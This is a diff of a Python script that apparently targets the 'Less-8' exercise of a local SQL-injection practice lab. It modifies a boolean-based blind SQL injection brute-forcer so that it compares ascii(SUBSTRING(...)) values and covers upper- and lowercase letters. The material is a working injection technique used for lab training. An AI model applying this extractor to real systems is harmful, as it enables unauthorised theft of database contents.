@@ -3,7 +3,7 @@ import requests, string
 
 URL = "http://localhost/Less-8/?id=1'"
 special_chars = "@"
-COMBINATIONS = string.ascii_lowercase + special_chars
+COMBINATIONS = string.ascii_letters + special_chars
 
 def make_request(url):
     try:
@@ -30,7 +30,7 @@ def user_length():
 
 def bruteforce_with(query, number, result):
     for i in COMBINATIONS:
-        url  = "%s and SUBSTRING(([query]),1,1)='%s" % (URL, str(i))
+        url  = "%s and ascii(SUBSTRING(([query]),1,1))='%s" % (URL, str(ord(i)))
         url = url.replace("([query]),1,1)", "(%s), %s, 1)" % (query, str(number)))
         if check_if_vulnerable(url):
             print("current letter : %s" % i)
